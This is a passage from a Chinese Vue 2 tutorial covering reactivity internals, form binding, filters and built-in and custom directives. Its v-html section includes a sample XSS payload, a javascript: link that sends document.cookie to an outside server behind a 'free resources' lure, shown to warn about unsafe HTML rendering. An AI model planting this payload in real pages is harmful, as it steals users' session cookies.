{\n    // 读取obj对象里key属性的特性\n    var property = Object.getOwnPropertyDescriptor(obj, key);\n    if (property && property.configurable === false) return\n    var getter = property && property.get;\n    var setter = property && property.set;\n    // val是重点，下面的getter和setter最后都是访问的val，它是中间量\n    if ((!getter || setter) && arguments.length === 2) {\n        val = obj[key];\n    }\n    // 多层级的对象暂时不考虑，这个会用到递归\n    // var childOb = !shallow && observe(val);\n    // 修改obj对象里key属性的特性\n    Object.defineProperty(obj, key, {\n        enumerable: true,\n        configurable: true,\n        get: function reactiveGetter() {\n            return getter ? getter.call(obj) : val;\n        },\n        set: function reactiveSetter(newVal) {\n            setter ? setter.call(obj, newVal) : (val = newVal);\n            /*\n                dep.notify();通知所有订阅者，订阅者会调用patch。\n                patch有在[6.3 key作用和简单diff分析]这节里说，\n                是比较新旧虚拟DOM，然后决定如果更新真实DOM\n            */\n            // dep.notify();\n            console.log(\'去重新渲染页面\');\n        }\n    });\n}\nvar vm = new Vue({\n    el: \'#root\',\n    data: {\n        name: \'张三\'\n    }\n});\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n\n\n\n# 7.3 Vue.set()\n\n可能会遇到这样一个需求，在存储数据中追加一个新属性，这个新属性在当时的配置对象的data里没有定义过。Vue给我么提供了Vue.set(target, key, value)和vm.$set(target, key, value)来实现这样的数据，这两个方法的参数列表都是一样的，target表示你要往哪个对象里添加，key是新属性名，value是新属性值。可以看下面的代码。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>姓名：{{person.name}}</h2>\n        <h2>性别：{{person.sex}}</h2>\n        <h2>年龄：{{person.age}}</h2>\n        <h2>爱好：{{person.hobby}}</h2>\n        <h2>学校：{{person.school}}</h2>\n        <button @click="addProperty">追加新属性</button>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                person: { name: \'张三\' }\n            },\n            methods: {\n                addProperty() {\n                    Vue.set(this._data.person, \'sex\', \'男\');\n                    this.$set(this._data.person, \'age\', 18);\n                    Vue.set(this.person, \'hobby\', \'打球\');\n                    this.$set(this.person, \'school\', \'武汉大学\');\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n上面的例子，在点击按钮后，页面上会出现新的展示信息，在浏览器控制台也可以检查到vm和vm._data里都有出现对应的新属性（可以直接加到vm上，因为有数据代理的关系）。然后Vue.set()和vm.$set()会有一个限制，这两个方法的第一个参数target，必须是存储数据中已存在的属性，不能是vm（Vue实例）也不能是vm._data（Vue实例根数据对象）。上面例子的target就是this._data.person已存在的属性。\n\n\n# 7.4 监视的数据是数组\n\n在前面说的数据监视，说的是对象类型的，没有提到数组类型的。下面是简化的源代码，对数组的每一项的本身并没有进行监视，但是会递归每一项，递归到的数据是对象，就会对这个对象的所有属性进行监视（就回到7.2 监视的数据是对象了）；递归到的是数组就继续递归，直至完毕。\n\nvar Observer = function Observer(value) {\n    this.value = value;\n    // 属性是数组形式的\n    if (Array.isArray(value)) {\n        if (hasProto) {\n            protoAugment(value, arrayMethods);\n        } else {\n            copyAugment(value, arrayMethods, arrayKeys);\n        }\n        // 对数组每一项进行observe递归\n        this.observeArray(value);\n    } else {\n        // 属性是对象形式的\n        this.walk(value);\n    }\n};\n/**\n * walk()里是调用了defineReactive$$1()\n * 而observeArray()是直接调用了observe()，递归了\n * 表达的意思是，对数组的每一项不进行监视，但对每一项里的所有属性进行observe递归，\n * 直到该项数据不是数组，就可以使用defineReactive$$1()进行监视了。\n*/\nObserver.prototype.observeArray = function observeArray(items) {\n    for (var i = 0, l = items.length; i < l; i++) {\n        observe(items[i]);\n    }\n};\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n因为对数组每一项没有进行监视，所以你完全替换掉某一项，页面是不会进行重新渲染的，这在7.1 更新时的一个问题里出现过。但是，对数组进行push()、pop()、shift()、unshift()、splice()、sort()、reverse()这些操作，会被Vue监视到。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <button @click="deleteItem">删除最后一项</button>\n        <ul>\n            <li v-for="(p, index) in persons" :key="p.id">\n                {{p.name}}-{{p.age}}\n            </li>\n        </ul>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                persons: [\n                    { id: \'001\', name: \'马冬梅\', age: 30 },\n                    { id: \'002\', name: \'周冬雨\', age: 25 },\n                    { id: \'003\', name: \'周杰伦\', age: 27 },\n                    { id: \'004\', name: \'温兆伦\', age: 21 },\n                ]\n            },\n            methods: {\n                deleteItem() {\n                    // 页面生效了\n                    !!this.persons.length && this.persons.pop();\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\n我们可以看到这一小节一开始的简化源代码里的protoAugment(value, arrayMethods);和copyAugment(value, arrayMethods, arrayKeys);，其中这个arrayMethods就是关键所在，Vue对数组的那7个方法进行了包裹，可以大概了解一下下面的源代码，在开发人员使用数组的这些方法时，Vue最终会走notify()去重新渲染页面。\n\nvar arrayProto = Array.prototype;\nvar arrayMethods = Object.create(arrayProto);\nvar methodsToPatch = [\'push\', \'pop\', \'shift\', \'unshift\', \'splice\', \'sort\', \'reverse\' ];\n\nmethodsToPatch.forEach(function (method) {\n    // cache original method\n    var original = arrayProto[method];\n    def(arrayMethods, method, function mutator() {\n        var args = [], len = arguments.length;\n        while (len--) args[len] = arguments[len];\n\n        var result = original.apply(this, args);\n        var ob = this.__ob__;\n        var inserted;\n        switch (method) {\n            case \'push\':\n            case \'unshift\':\n                inserted = args;\n                break\n            case \'splice\':\n                inserted = args.slice(2);\n                break\n        }\n        if (inserted) { ob.observeArray(inserted); }\n        // notify change\n        ob.dep.notify();\n        return result\n    });\n});\nfunction def(obj, key, val, enumerable) {\n    Object.defineProperty(obj, key, {\n        value: val,\n        enumerable: !!enumerable,\n        writable: true,\n        configurable: true\n    });\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. Vue会监视data中所有层次的数据（数组每项有些特殊）。\n 2. Vue通过setter实现监视，且要在Vue实例化时传入配置对象，配置对象包含data。\n    1. 对象中追加的属性，Vue默认不做响应式处理；\n    2. 若要给追加的属性做响应式处理，请使用Vue.set()或vm.$set()。\n 3. Vue对数组进行监视比较特殊，对数组本身这个引用（属于对象的某个属性）是做了监视，而对数组里每一项的本身没有做监视。然后对数组的7个常用方法做了监视。\n    1. 7个方法是push()、pop()、shift()、unshift()、splice()、sort()、reverse()；\n    2. 若不使用上面7个方法也想达到响应式处理效果，可以使用Vue.set()或vm.$set()，例如Vue.set(vm.persons, 1, { id: \'003\', name: \'周杰伦\', age: 27 })。\n 4. Vue.set()和vm.$set()不能给vm或根数据对象（data）添加属性。\n\n----------------------------------------\n\n\n# 八、表单和过滤器\n\n\n# 8.1 收集表单数据\n\n我们在1.3 单向和双向数据绑定这一节了简单介绍过v-model，但实际使用还不是表面这么简单，有很多关于收集表单数据的技巧。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n    \x3c!-- form这里用不到action，一般使用ajax进行请求。submit表单的提交事件 --\x3e\n    <form @submit.prevent="submit">\n        \x3c!-- 点击标签也能让输入框获取焦点，可以使用for属性关联输入框 --\x3e\n        \x3c!--给v-model加上修饰符，去掉收尾的空格--\x3e\n        <label for="account">账号：</label>\n        <input type="text" id="account" v-model.trim="userInfo.account"><br><br>\n        <label for="password">密码：</label>\n        <input type="password" id="password" v-model="userInfo.password"><br><br>\n        \x3c!-- 加上number类型的限制，即使type是number，data里还是字符串，得使用v-model的修饰符 --\x3e\n        年龄：<input type="number" v-model.number="userInfo.age"><br><br>\n        \x3c!-- 一组单选框相当于单选题，各自的value="xxx"是单选题的选项，v-model="yyy"是单选题的答案 --\x3e\n        性别：\n        <input type="radio" v-model="userInfo.sex" value="male">男\n        <input type="radio" v-model="userInfo.sex" value="female">女<br><br>\n        \x3c!-- 一组复选框相当于多选题，各自的value="xxx"是多选题的选项，v-model="yyy"是多选题的答案 --\x3e\n        \x3c!-- 这个多选题的答案绑定yyy变量，最好是使用数组类型，除非这里只有一个input --\x3e\n        爱好：\n        <input type="checkbox" v-model="userInfo.hobby" value="study">学习\n        <input type="checkbox" v-model="userInfo.hobby" value="compute">上网\n        <input type="checkbox" v-model="userInfo.hobby" value="eat">吃饭<br><br>\n        所属地区：\n        <select v-model="userInfo.city">\n            <option value="beijing">北京</option>\n            <option value="shanghai">上海</option>\n            <option value="guangzhou">广州</option>\n            <option value="shenzhen">深圳</option>\n        </select><br><br>\n        \x3c!-- 给v-model加上修饰符，让它不要实时收集数据，只在失去焦点时才收集 --\x3e\n        其他信息：<textarea v-model.lazy="userInfo.other"></textarea><br><br>\n        \x3c!-- 单个的checkbox类input，直接去掉value="xxx"，v-model直接收集checked了（布尔值） --\x3e\n        <input type="checkbox" v-model="userInfo.agree"> 阅读并接受\n        <a href="www.baidu.com">《用户协议》</a><br><br>\n        <button>提交</button>\n    </form>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                userInfo: {\n                    account: \'\',\n                    password: \'\',\n                    age: \'\',\n                    sex: \'male\',\n                    hobby: [],\n                    city: \'\',\n                    other: \'\',\n                    agree: false\n                }\n            },\n            methods: {\n                submit() {\n                    console.log(\'userInfo\', this.userInfo);\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 常用的浏览器自带表单类组件<input type="xxx">、<select>、<textarea>等，v-model基本都是绑定的value属性，都可以用简写形式。\n 2. v-model在个别组件会表现得有些特殊。\n    1. <input type="radio">，多个“选项”（input）形成一道“单选题”，最后还要有“答案”。每个选项得先加上“标号”才能使用（单选题的A、B、C），那就给每个input设置值不相同的value属性（值常用常量字符串）。这个答案就是沟通内外的桥梁，那就给每个input设置v-model="xxx"，xxx就是答案（通常是data里的某个变量）。\n    2. <input type="checkbox">，它和上面的radio很像，同样要给每个input设置值不相同的value属性（多选题的A、B、C），同样要给每个input设置v-model="xxx"（多选题的答案）。开发人员要根据选项的数量（input数量）决定这个xxx是什么类型的变量，多个input就用数组类型（收集多个input的value），单个input就是用布尔类型（只有一个input，直接收集checked）。\n 3. v-model有三个修饰符：\n    1. .trim，去掉输入值首尾的空格；\n    2. .number，输入字符串转为有效的数值；\n    3. .lazy，失去焦点再收集数据。\n 4. 可以用<label>的for属性关联<input>的id属性，那么在点击标签时也能让输入框获得焦点。\n 5. <form>表单一般用不到action属性了，可以使用@submit绑定事件作为提交，并且还能加上事件修饰符（例如.prevent）。\n\n----------------------------------------\n\n\n# 8.2 过滤器\n\n我们经常遇到将时间戳转换后再到页面展示，转换的标准是固定的，我们可以引入第三方的类库来处理。引入后，这些格式化方法可以形成一个过滤器方法，能被多处调用。过滤器使用的是filters（它与computed平级），里面都是过滤器方法，在模板里使用的使用会与变量用|隔开。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    \x3c!--引入时间处理相关的第三方类库--\x3e\n    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>{{time|timeFormater}}</h2>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                time: 1631345001107\n            },\n            // 过滤器\n            filters: {\n                // value值就是“|”前面那个变量的值（默认传参），将这个值进行格式化后return\n                timeFormater(value) {\n                    return dayjs(value).format(\'YYYY-MM-DD HH:mm:ss\');\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n * 过滤器可以额外接收参数，过滤方法还是一样的，要适配好传参不传参的情况。\n * 可以组合使用多个过滤器方法，继续在原基础上追加|xxxFormater，对应在filters里新增过滤器方法。\n * 写在Vue实例的配置对象里filters的是局部过滤器，我们是可以定义全局过滤器，在Vue实例化前使用Vue.filter(\'xxx\',function(){})。定义全局过滤器的原因是，让多个组件使用（组件会在后面将）。\n * 过滤器是可以使用在v-bind指令里的，但是不能使用在v-model指令里。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    \x3c!--引入时间处理相关的第三方类库--\x3e\n    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.10.6/dayjs.min.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>{{time|timeFormater}}</h2>\n        \x3c!-- 过滤器额外接收参数，整体方法不变，对应要优化过滤器方法 --\x3e\n        <h2>{{time|timeFormater(\'YYYY-MM-DD\')}}</h2>\n        \x3c!-- 追加使用新的过滤器方法 --\x3e\n        <h2>{{time|timeFormater(\'YYYY-MM-DD\')|sliceStr}}</h2>\n        \x3c!-- addStr是全局过滤器 --\x3e\n        <h2>{{time|timeFormater(\'YYYY-MM-DD\')|sliceStr|addStr}}</h2>\n        <h2 :x="msg|sliceStr">在v-bind里使用sliceStr过滤器，打开F12查看</h2>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        // 在Vue实例化前定义一个全局过滤器\n        Vue.filter(\'addStr\', function (value) {\n            return value + \'我是全局过滤器添加的小尾巴\';\n        });\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                time: 1631345001107,\n                msg: \'你在看什么？\'\n            },\n            // 过滤器\n            filters: {\n                // value是默认传参，这里对之前的代码进行了优化\n                timeFormater(value, formatStr = \'YYYY-MM-DD HH:mm:ss\') {\n                    return dayjs(value).format(formatStr);\n                },\n                // 新过滤器方法\n                sliceStr(value) {\n                    return value.slice(0, 4)\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 过滤器定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑处理）。\n 2. 过滤器语法：Vue.filter(\'xxx\',function(value){})全局定义过滤器，new Vue({filters:{xxx(value){}}})局部定义过滤器。\n 3. 过滤器的使用：{{xxx|yyyFormater}} 或 v-bind="xxx|yyyFormater"，但要记得不要在v-model里使用过滤器。\n 4. 过滤器可以额外接收参数，多个过滤器可以组合使用（串联）。\n\n----------------------------------------\n\n\n# 九、内置指令和自定义指令\n\n\n# 9.1 内置指令\n\n在1.3 单向和双向数据绑定里介绍了v-bind和v-model，在3.1 事件处理里介绍了v-on，在6.1 条件渲染里介绍了v-show和v-if，在6.2 列表渲染里介绍了v-for。这些都是内置指令，也就是Vue提供的指令。这一节我们将剩下的内置指令简单介绍一下。\n\nv-text="xxx"会整体替换掉标签的标签体内容。与插值{{xxx}}的区别，插值可以插入到标签体内容而替换局部。还有值得注意的是，即使xxx里有标签也不会被解析，会直接被当做字符串来展示。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <div v-text="name"></div>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: { name: \'<h2>张三</h2>\', },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nv-html是可以支持标签解析的，这是与v-text的区别。v-html可能会涉及到安全问题，因为它在解析标签的时候可能会遇到js代码里获取敏感信息，将这些敏感信息泄露给不怀好意的服务器。下面这个例子，会将<a>解析出来，这个<a>有恶意js脚本，点击<a>会读取浏览器的cookie信息，并将这个cookie信息传递给了跳转的服务器地址。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <div v-html="msg"></div>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        // 其实cookie中有个HttpOnly字段，可以只让http协议相关的才能读取cookie信息，避免js代码读取\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                msg: `<a href=javascript:location.href=\'http://www.baidu.com?\'+document.cookie>这里有你想要的资源，限时免费哟！</a>`,\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\nv-cloak指令经常搭配css使用。在Vue还没有接管容器时，模板中使用v-cloak就会出现这个同名属性，在Vue接管容器后，模板中的v-cloak属性就会消失。如果搭配css使用，在v-cloak属性出现时，让所有用于该属性的元素进行display:none隐藏，在v-cloak属性消失后该css样式失效。这样做的目的，是为了让用户不要见到类似{{xxx}}等，提高用户的感观。\n\n我们将以前的代码结构稍加调整，将<script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>移到了容器下方，并将浏览器的下载速率限制到100k/s，这样的话vue.js会下载很慢，那就会让类似{{xxx}}先显示在页面上，但这样对用户感观不好。所以又使用了v-cloak配合css样式优化了这一点（你可以去掉v-cloak看会出现什么问题），代码如下，记得页面刷新的时候，使用“清除缓存并硬性重新加载”。\n\n\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <style>\n        [v-cloak] {\n            display: none;\n        }\n    </style>\n</head>\n<body>\n    <div id="root">\n        <div v-cloak>{{name}}</div>\n    </div>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</body>\n<script type="text/javascript">\n    Vue.config.productionTip = false;\n    const vm = new Vue({\n        el: \'#root\',\n        data: {\n            name: \'张三\'\n        },\n    });\n<\/script>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\nv-once指令让元素初次渲染后就不再动态变化了，会被视为静态内容。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2 v-once>初始化值：{{num}}</h2>\n        <h2>当前的值：{{num}}</h2>\n        <button @click="num++">点我加一</button>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: { num: 5 },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nv-pre指令是告知Vue不要解析它所在的元素了，直接展示在页面。比较适用于没有模板语法的元素。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2 v-pre>这里是静态文本，没有使用模板语法</h2>\n        <h2>当前的值：{{num}}</h2>\n        <button @click="num++">点我加一</button>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: { num: 5 },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. v-text向其所在节点中渲染文本内容。它是整体替换标签体内容，而插值能只代替一部分。\n 2. v-html向指定中渲染包含html结构的内容。与v-text类似，它也会整体替换标签体内容，但是它会解析内容里的标签。\n 3. v-html有安全性问题，在网站上动态渲染html是非常危险的，容易导致XSS攻击，一定要在可信内容上使用v-html，不要在用户提交的内容里使用。\n 4. v-cloak指令是没有值的，本质是一个特殊属性。Vue实例创建完毕并接管容器后，会删除v-cloak属性。搭配css使用，可以解决网速慢时页面展示出{{xxx}}的问题。\n 5. v-once指令所在节点在初次动态渲染后，就被视为静态内容了。以后数据变化不会引起v-once所在节点的更新，可以用于性能优化。\n 6. v-pre是跳过其所在节点的解析过程。可用它跳过没有使用模板语法的节点，加快组件的解析过程。\n\n----------------------------------------\n\n\n# 9.2 自定义指令\n\n自定义指令是对原生DOM操作进行了封装，将这些操作封装成了一个自定义指令。自定义指令是定义在directives里，directives与methods平级，自定义指令时，不用自己加上v-，但在模板里使用还是v-xxx。\n\n自定义指令有函数和对象两种定义形式。我们先看函数的形式，它接收两个参数：element和binding。其中element是自定义指令使用时，它所在的真实DOM元素，binding是自定义指令的绑定目标，例如v-xxx=\'yyy\'中的yyy。\n\nbinding里的expression属性是绑定目标，它是js表达式；binding里的name属性就是自定义指令的名字；binding里的rawName属性就是自定义指令在使用时的名字；binding里的value属性就是绑定目标最终的值（js表达式的值）。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>当前的值：{{num}}</h2>\n        <h2>放大10倍后的值：<span v-big="num"></span></h2>\n        <button @click="num++">点我加一</button>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: {\n                num: 5\n            },\n            // 自定义指令存放处\n            directives: {\n                // element是自定义指令使用处所在的真实元素，binding是绑定的动态变量\n                big(element, binding) {\n                    // 将原来的num放大10倍\n                    element.innerText = binding.value * 10;\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n上面例子的big函数会在何时被调用？\n\n * 在自定义指令与元素成功绑定时；\n * 自定义指令所在模板被重新解析时。\n\n这两点都有各自的注意点，首先看第二点，自定义指令并不是在它所依赖数据变化时被调用，而是在模板被重新解析时被调用，这是Vue扩大了范围更加准确无误地让自定义指令运行。\n再看第一点，与“元素”成功绑定，这个“元素”是虚拟元素，此时对应的真实元素还没有生成也还没有添加到页面上进行展示。\n\n因为big函数的第一点调用时机会导致一些代码无法生效，比如让元素在初始化时获得焦点。你看下面这个例子，element.focus()运行了但没有生效，原因就是focus()必须在真实元素添加到DOM结构后才能获得焦点，这就与第一点调用时机对应不上了，所以focus()也就不生效了。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>当前的值：{{num}}</h2>\n        <h2>新的input：<input v-fbind:value="num"></h2>\n        <button @click="num++">点我加一</button>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: { num: 5 },\n            directives: {\n                fbind(element, binding) {\n                    element.value = binding.value;\n                    element.focus();\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n要解决上面的问题，就得使用对象形式的自定义指令。该对象有三个属性bind、inserted和update，三个属性的值是方法，在运行到特定时机会调用对应的这三个方法中的其中一个。\n\n * bind是在自定义指令与虚拟元素成功绑定时被调用；\n * inserted是自定义指令所在真实元素被插入到页面时被调用；\n * update是自定义指令在模板被重新解析时被调用。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>当前的值：{{num}}</h2>\n        <h2>新的input：<input v-fbind:value="num"></h2>\n        <button @click="num++">点我加一</button>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        const vm = new Vue({\n            el: \'#root\',\n            data: { num: 5 },\n            directives: {\n                fbind: {\n                    // 自定义指令与虚拟元素成功绑定时bind被调用\n                    bind(element, binding) {\n                        element.value = binding.value;\n                    },\n                    // 自定义指令所在真实元素被插入到页面时inserted被调用\n                    inserted(element, binding) {\n                        element.focus();\n                    },\n                    // 自定义指令在模板被重新解析时update被调用\n                    update(element, binding) {\n                        // 这行别忘写了，模板更新时这个数据也得更新\n                        element.value = binding.value;\n                    }\n                }\n            }\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n自定义指令的其他注意点：\n\n * 自定义指令的命名，如果是多个单词，就使用-短横线进行分隔，在directives方法对应就写字符串形式。\n * 自定义指令相关的回调函数，也就是bind、inserted和update这三个方法，它们的this不是vm，而是Window本身。原因就是它们的入参element和binding就足够使用了，无需用到Vue实例。\n * 我们可以定义全局自定义指令，使用的是Vue.directive(\'xxx\', {bind(){},inserted(){},update(){}})。\n\n<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <title>Document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>当前的值：{{num}}</h2>\n        <h2>放大5倍后的值：<span v-big="num"></span></h2>\n        \x3c!-- 自定义指令是多个单词组成，使用短横线-分隔 --\x3e\n        <h2>放大10倍后的值：<span v-big-number="num"></span></h2>\n        <h2>新的input：<input v-fbind:value="num"></input></h2>\n        <button @click="num++">点我加一</button>\n    </div>\n    <script type="text/javascript">\n        Vue.config.productionTip = false;\n        // 全局自定义属性\n        Vue.directive(\'big\', function (element, binding) {\n            element.innerText = binding.value * 5;\n        })\n        const vm = new Vue({\n            el: \'#root\',\n            data: { num: 5 },\n            directives: {\n                // 自定义指令是多个单词组成，定义处使用字符串形式\n                \'big-number\': function (element, binding) {\n                    // 自定义指令的this是指向Window的\n                    console.log(\'this\', this);\n                    element.innerText = binding.value * 10;\n                },\n                fbind: {\n                    // 自定义指令与虚拟元素成功绑定时bind被调用\n                    bind(element, binding) {\n                        element.value = binding.value;\n                    },\n                    // 自定义指令所在真实元素被插入到页面时inserted被调用\n                    inserted(element, binding) {\n                        element.focus();\n                    },\n                    // 自定义指令在模板被重新解析时update被调用\n                    update(element, binding) {\n                        element.value = binding.value;\n                    